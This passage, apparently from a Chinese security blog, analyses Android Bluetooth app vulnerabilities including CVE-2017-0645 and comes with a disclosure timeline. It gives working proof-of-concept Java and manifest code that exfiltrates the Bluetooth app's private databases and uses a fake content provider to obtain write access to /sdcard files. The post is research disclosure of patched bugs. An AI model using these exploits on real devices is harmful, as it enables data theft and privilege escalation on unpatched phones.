<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    Button m_btnSendPriv = <span class="keyword">null</span>;</span><br><span class="line">    Button m_btnSendMPriv = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> String PRIV_FILE_URI1 = <span class="string">&quot;file:///data/user_de/0/com.android.bluetooth/databases/btopp.db&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> String PRIV_FILE_URI2 = <span class="string">&quot;file:///data/misc/bluedroid/bt_config.conf&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        m_btnSendPriv = (Button)findViewById(R.id.send_private);</span><br><span class="line">        m_btnSendPriv.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_SEND);</span><br><span class="line">                intent.setType(<span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">                Uri uri = Uri.parse(PRIV_FILE_URI1);</span><br><span class="line">                intent.putExtra(Intent.EXTRA_STREAM, uri);</span><br><span class="line">                intent.setComponent(<span class="keyword">new</span> ComponentName(<span class="string">&quot;com.android.bluetooth&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;com.android.bluetooth.opp.BluetoothOppLauncherActivity&quot;</span>));</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        m_btnSendMPriv = (Button)findViewById(R.id.send_private_multiple);</span><br><span class="line">        m_btnSendMPriv.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_SEND_MULTIPLE);</span><br><span class="line">                intent.setType(<span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">                ArrayList&lt;Uri&gt; uris = <span class="keyword">new</span> ArrayList&lt;Uri&gt;();</span><br><span class="line">                uris.add(Uri.parse(PRIV_FILE_URI1));</span><br><span class="line">                uris.add(Uri.parse(PRIV_FILE_URI2));</span><br><span class="line">                intent.putExtra(Intent.EXTRA_STREAM, uris);</span><br><span class="line">                intent.setComponent(<span class="keyword">new</span> ComponentName(<span class="string">&quot;com.android.bluetooth&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;com.android.bluetooth.opp.BluetoothOppLauncherActivity&quot;</span>));</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x04-进一步分析"><a href="#0x04-进一步分析" class="headerlink" title="0x04 进一步分析"></a>0x04 进一步分析</h3><p>真的那么简单吗？编译PoC，运行却抛出了安全异常！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">--------- beginning of crash</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: FATAL EXCEPTION: main</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: Process: ms509.com.testaospbluetoothopplauncher, PID: 16171</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: android.os.FileUriExposedException: file:&#x2F;&#x2F;&#x2F;data&#x2F;user_de&#x2F;0&#x2F;com.android.bluetooth&#x2F;databases&#x2F;btopp.db exposed beyond app through ClipData.Item.getUri()</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.os.StrictMode.onFileUriExposed(StrictMode.java:1799)</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.net.Uri.checkFileUriExposed(Uri.java:2346)</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.content.ClipData.prepareToLeaveProcess(ClipData.java:832)</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.content.Intent.prepareToLeaveProcess(Intent.java:8909)</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.content.Intent.prepareToLeaveProcess(Intent.java:8894)</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.app.Instrumentation.execStartActivity(Instrumentation.java:1517)</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.app.Activity.startActivityForResult(Activity.java:4224)</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.support.v4.app.BaseFragmentActivityJB.startActivityForResult(BaseFragmentActivityJB.java:50)</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.support.v4.app.FragmentActivity.startActivityForResult(FragmentActivity.java:79)</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.app.Activity.startActivityForResult(Activity.java:4183)</span><br></pre></td></tr></table></figure>

<p>原来触发了FileUriExposed错误，出于安全考虑，Android SDK 23以上就不能在Intent中传递file:// Uri，见官方说明：</p>
<p>对于面向 Android 7.0 的应用，Android 框架执行的 StrictMode API 政策禁止在您的应用外部公开 file:// URI。如果一项包含文件 URI 的 intent 离开您的应用，则应用出现故障，并出现 FileUriExposedException 异常。要在应用间共享文件，您应发送一项 content:// URI，并授予 URI 临时访问权限。进行此授权的最简单方式是使用 FileProvider 类。</p>
<p>似乎宣判了死刑！心有不甘，继续分析BluetoothOppLauncherActivity后面的文件处理流程，调用链为saveSendingFileInfo–&gt; generateFileInfo，查看generateFileInfo函数，我们发现其实是支持传入file:// URI的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> BluetoothOppSendFileInfo <span class="title">generateFileInfo</span><span class="params">(Context context, Uri uri,</span></span></span><br><span class="line"><span class="function"><span class="params">        String type)</span> </span>&#123;</span><br><span class="line">    ContentResolver contentResolver = context.getContentResolver();</span><br><span class="line">    String scheme = uri.getScheme();</span><br><span class="line">    String fileName = <span class="keyword">null</span>;</span><br><span class="line">    String contentType;</span><br><span class="line">    <span class="keyword">long</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Support all Uri with &quot;content&quot; scheme</span></span><br><span class="line">    <span class="comment">// This will allow more 3rd party applications to share files via</span></span><br><span class="line">    <span class="comment">// bluetooth</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;content&quot;</span>.equals(scheme)) &#123;</span><br><span class="line">        contentType = contentResolver.getType(uri);</span><br><span class="line">        Cursor metadataCursor;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            metadataCursor = contentResolver.query(uri, <span class="keyword">new</span> String[] &#123;</span><br><span class="line">                    OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE</span><br><span class="line">            &#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLiteException e) &#123;</span><br><span class="line">            <span class="comment">// some content providers don&#x27;t support the DISPLAY_NAME or SIZE columns</span></span><br><span class="line">            metadataCursor = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;generateFileInfo: Permission error, could not access URI: &quot;</span> + uri);</span><br><span class="line">            <span class="keyword">return</span> SEND_FILE_INFO_ERROR;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (metadataCursor != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (metadataCursor.moveToFirst()) &#123;</span><br><span class="line">                    fileName = metadataCursor.getString(</span><br><span class="line">                            metadataCursor.getColumnIndex(OpenableColumns.DISPLAY_NAME));</span><br><span class="line">                    length = metadataCursor.getLong(</span><br><span class="line">                            metadataCursor.getColumnIndex(OpenableColumns.SIZE));</span><br><span class="line">                    <span class="keyword">if</span> (D) Log.d(TAG, <span class="string">&quot;fileName = &quot;</span> + fileName + <span class="string">&quot; length = &quot;</span> + length);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                metadataCursor.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fileName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// use last segment of URI if DISPLAY_NAME query fails</span></span><br><span class="line">            fileName = uri.getLastPathSegment();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;file&quot;</span>.equals(scheme)) &#123; <span class="comment">// Notice!!!</span></span><br><span class="line">        fileName = uri.getLastPathSegment();</span><br><span class="line">        contentType = type;</span><br><span class="line">        File f = <span class="keyword">new</span> File(uri.getPath());</span><br><span class="line">        length = f.length();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// currently don&#x27;t accept other scheme</span></span><br><span class="line">        <span class="keyword">return</span> SEND_FILE_INFO_ERROR;</span><br></pre></td></tr></table></figure>

<p>进一步查阅相关资料发现，原来FileUriExposed错误只是SDK引入的一项安全机制，仅仅是为了防止Intent的接收方访问发起方的私有文件。但是在我们这种攻击场景下，我们是要Intent的接收方BluetoothOppLauncherActivity访问其自己的私有文件，而且查看上述代码，既有对file:// URI的支持，也缺乏对文件是否属于私有目录的验证，Why not?</p>
<p>既然是SDK 23以后引入的安全机制，那么我们把build.gradle中的targetSdkVersion从原先的25改为23，重新编译运行，就可以将Bluetooth App的私有文件通过蓝牙发送出去，而这些文件原本连用户均无法获取，这就打破了Android沙箱的应用间数据隔离机制。至此，大功告成！<br>success</p>
<h3 id="0x05-时间线"><a href="#0x05-时间线" class="headerlink" title="0x05 时间线"></a>0x05 时间线</h3><pre><code>2017.02.13: 提交Google
2017.03.01: 漏洞确认，初始评级为高
2017.06.05: 补丁发布
2017.06.12: 漏洞公开
</code></pre>
<h2 id="蓝牙App漏洞系列分析之三CVE-2017-0645"><a href="#蓝牙App漏洞系列分析之三CVE-2017-0645" class="headerlink" title="蓝牙App漏洞系列分析之三CVE-2017-0645"></a>蓝牙App漏洞系列分析之三CVE-2017-0645</h2><h3 id="0x01-漏洞简介-1"><a href="#0x01-漏洞简介-1" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h3><p>Android 6月的安全公告，同时还修复了我们发现的一个蓝牙 App 提权中危漏洞，该漏洞允许手机本地无权限的恶意程序构造一个仿冒的 Provider ，并获取 Provider 所指向文件的读写权限，可用于写 SD 卡或者蓝牙共享数据库，漏洞详情如下：</p>
<pre><code>CVE: CVE-2017-0645
BugID: A-35310991
严重性: 中危
漏洞类型: 提权
Updated AOSP versions: 6.0.1, 7.0, 7.1.1, 7.1.2
</code></pre>
<h3 id="0x02-漏洞分析-1"><a href="#0x02-漏洞分析-1" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>该漏洞其实是一个常规的 Android 组件暴露漏洞，跟我们上一个分析的蓝牙漏洞一样，我们知道在蓝牙 App 中 BluetoothOppLauncherActivity 是可以被第三方应用启动的。这一次，我们来看 onCreate 函数中传入 Intent action 为 android.btopp.intent.action.OPEN 的处理流程。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (action.equals(Constants.ACTION_OPEN)) &#123;</span><br><span class="line">    Uri uri = getIntent().getData();</span><br><span class="line">    <span class="keyword">if</span> (V) Log.v(TAG, <span class="string">&quot;Get ACTION_OPEN intent: Uri = &quot;</span> + uri);</span><br><span class="line"></span><br><span class="line">    Intent intent1 = <span class="keyword">new</span> Intent();</span><br><span class="line">    intent1.setAction(action);</span><br><span class="line">    intent1.setClassName(Constants.THIS_PACKAGE_NAME, BluetoothOppReceiver.class.getName());</span><br><span class="line">    intent1.setDataAndNormalize(uri);</span><br><span class="line">    <span class="keyword">this</span>.sendBroadcast(intent1);</span><br><span class="line">    finish();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>转到 BluetoothOppReceiver 进行处理。接着查看 BluetoothOppReceiver 的 onReceive 函数，由于Intent 可控，这里蓝牙 App 将会取出 intent 中的 Data 进行数据库查询，然后取出 transInfo ，最后进入 BluetoothOppUtility.openReceivedFile 函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (action.equals(Constants.ACTION_OPEN) || action.equals(Constants.ACTION_LIST)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (V) &#123;</span><br><span class="line">        <span class="keyword">if</span> (action.equals(Constants.ACTION_OPEN)) &#123;</span><br><span class="line">            Log.v(TAG, <span class="string">&quot;Receiver open for &quot;</span> + intent.getData());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Log.v(TAG, <span class="string">&quot;Receiver list for &quot;</span> + intent.getData());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BluetoothOppTransferInfo transInfo = <span class="keyword">new</span> BluetoothOppTransferInfo();</span><br><span class="line">    Uri uri = intent.getData();  <span class="comment">//Intent可控！</span></span><br><span class="line">    transInfo = BluetoothOppUtility.queryRecord(context, uri);</span><br><span class="line">    <span class="keyword">if</span> (transInfo == <span class="keyword">null</span>) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">&quot;Error: Can not get data from db&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (transInfo.mDirection == BluetoothShare.DIRECTION_INBOUND</span><br><span class="line">            &amp;&amp; BluetoothShare.isStatusSuccess(transInfo.mStatus)) &#123;</span><br><span class="line">        <span class="comment">// if received file successfully, open this file</span></span><br><span class="line">        <span class="comment">// transInfo可控！</span></span><br><span class="line">        BluetoothOppUtility.openReceivedFile(context, transInfo.mFileName,</span><br><span class="line">                transInfo.mFileType, transInfo.mTimeStamp, uri);</span><br><span class="line">        BluetoothOppUtility.updateVisibilityToHidden(context, uri);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Intent in = <span class="keyword">new</span> Intent(context, BluetoothOppTransferActivity.class);</span><br><span class="line">        in.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">        in.setDataAndNormalize(uri);</span><br><span class="line">        context.startActivity(in);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在 openReceivedFile 函数中，我们看到蓝牙 App 最终将在授予读写权限后，启动能够处理 transInfo.mFileType 文件类型的某外部 App 的 Activity ，对 transInfo.mFileName 进行处理。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">openReceivedFile</span><span class="params">(Context context, String fileName, String mimetype,</span></span></span><br><span class="line"><span class="function"><span class="params">        Long timeStamp, Uri uri)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (fileName == <span class="keyword">null</span> || mimetype == <span class="keyword">null</span>) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">&quot;ERROR: Para fileName ==null, or mimetype == null&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    File f = <span class="keyword">new</span> File(fileName); <span class="comment">//fileName可控</span></span><br><span class="line">    <span class="keyword">if</span> (!f.exists()) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// skip</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// path受限于com.google.android.bluetooth.fileprovider使用的位置</span></span><br><span class="line"></span><br><span class="line">    Uri path = FileProvider.getUriForFile(context,</span><br><span class="line">                   <span class="string">&quot;com.google.android.bluetooth.fileprovider&quot;</span>, f);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there is no scheme, then it must be a file</span></span><br><span class="line">    <span class="keyword">if</span> (path.getScheme() == <span class="keyword">null</span>) &#123;</span><br><span class="line">        path = Uri.fromFile(<span class="keyword">new</span> File(fileName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isRecognizedFileType(context, path, mimetype)) &#123;</span><br><span class="line">        Intent activityIntent = <span class="keyword">new</span> Intent(Intent.ACTION_VIEW);</span><br><span class="line">        activityIntent.setDataAndTypeAndNormalize(path, mimetype);</span><br><span class="line"></span><br><span class="line">        List&lt;ResolveInfo&gt; resInfoList = context.getPackageManager()</span><br><span class="line">            .queryIntentActivities(activityIntent,</span><br><span class="line">                    PackageManager.MATCH_DEFAULT_ONLY);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 注意这段，授予任何app对该文件的读写权限</span></span><br><span class="line">        <span class="comment">// Grant permissions for any app that can handle a file to access it</span></span><br><span class="line">        <span class="keyword">for</span> (ResolveInfo resolveInfo : resInfoList) &#123;</span><br><span class="line">            String packageName = resolveInfo.activityInfo.packageName;</span><br><span class="line">            context.grantUriPermission(packageName, path,</span><br><span class="line">                    Intent.FLAG_GRANT_WRITE_URI_PERMISSION |</span><br><span class="line">                    Intent.FLAG_GRANT_READ_URI_PERMISSION);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        activityIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">        <span class="comment">// 授予activity对该文件的读写权限</span></span><br><span class="line">        activityIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);</span><br><span class="line">        activityIntent.setFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (V) Log.d(TAG, <span class="string">&quot;ACTION_VIEW intent sent out: &quot;</span> + path + <span class="string">&quot; / &quot;</span> + mimetype);</span><br><span class="line">            context.startActivity(activityIntent); </span><br></pre></td></tr></table></figure>

<p>由于 Intent 可控， Intent Data 可控， transInfo 可控，再加上启动的外部 App 被授予了读写权限，因此这里存在漏洞，我们可以伪造一个文件让蓝牙 App 启动某外部 App 打开，同时该外部 App 获得对伪造文件指向位置的读写权限。可惜此处伪造的文件位置受限于 com.android.bluetooth.filepovider ，其 file_paths.xml 使用的 external-path ，这意味着我们只能伪造一个外部存储 /sdcard 目录的文件。</p>
<h3 id="0x03-漏洞利用-1"><a href="#0x03-漏洞利用-1" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>漏洞利用可如下图所示，这种攻击发送 intent 的过程像极了飞去来器。恶意 App 发送 intent 过后,又回到了自己手中，但却获得了提权。</p>
<p>1.恶意 App 声明能对某种 filetype 进行处理</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.FakeViewActivity&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.VIEW&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:mimeType</span>=<span class="string">&quot;xxx/yyy&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.构造一个虚假的 bluetooth share provider——FakeBluetoothOppProvider ，传入 intent data 之中。主要内容可以参考 BluetoothOppProvider ，其 Uri 为</p>
<p>content://fake.bluetooth.provider/btopp/</p>
<p>并expose出来</p>
<p><provider
            android:authorities="fake.bluetooth.provider"
            android:name=".FakeBluetoothOppProvider"
            android:exported="true" /></p>
<p>然后填入内容，指向 /sdcard 中某个已知文件，并传入 Intent data , 启动 BluetoothOppLauncherActivity</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">m_btnTest.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">        intent.setComponent(<span class="keyword">new</span> ComponentName(<span class="string">&quot;com.android.bluetooth&quot;</span>,</span><br><span class="line">                <span class="string">&quot;com.android.bluetooth.opp.BluetoothOppLauncherActivity&quot;</span>));</span><br><span class="line">        intent.setAction(Constants.ACTION_OPEN);</span><br><span class="line">        intent.setData(Uri.parse(<span class="string">&quot;content://fake.bluetooth.provider/btopp/1&quot;</span>));</span><br><span class="line">        startActivity(intent);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">m_btnAddFakeEntry = (Button)findViewById(R.id.add);</span><br><span class="line">m_btnAddFakeEntry.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        ContentValues values = <span class="keyword">new</span> ContentValues();</span><br><span class="line">        values.put(BluetoothShare._ID, <span class="number">1</span>);</span><br><span class="line">        values.put(BluetoothShare.DIRECTION, BluetoothShare.DIRECTION_INBOUND);</span><br><span class="line">       values.put(BluetoothShare.TOTAL_BYTES, <span class="number">110000</span>);</span><br><span class="line">        values.put(BluetoothShare.CURRENT_BYTES,<span class="number">110000</span>);</span><br><span class="line">        values.put(BluetoothShare.TIMESTAMP, <span class="number">111111</span>);</span><br><span class="line">        values.put(BluetoothShare.DESTINATION, <span class="string">&quot;00:10:60:AA:36:F8&quot;</span>);</span><br><span class="line">        values.put(BluetoothShare._DATA, <span class="string">&quot;/storage/emulated/0/CVE-2016-6762.apk&quot;</span>);</span><br><span class="line">       values.put(BluetoothShare.MIMETYPE, <span class="string">&quot;xxx/yyy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        values.put(BluetoothShare.USER_CONFIRMATION, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// when content provider is null, use insert or use update</span></span><br><span class="line"></span><br><span class="line">        m_contentResolver.insert(BluetoothShare.CONTENT_URI, values);</span><br><span class="line">       <span class="comment">// m_contentResolver.update(BluetoothShare.CONTENT_URI, values, &quot;_id = 12&quot;, null);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>3.蓝牙 App 取出我们构造的 filename, filetype；<br>4.蓝牙 App 授予读写权限，然后再启动恶意 App 进行处理;<br>5.恶意 App 直接删除 /sdcard 中的这个文件。</p>
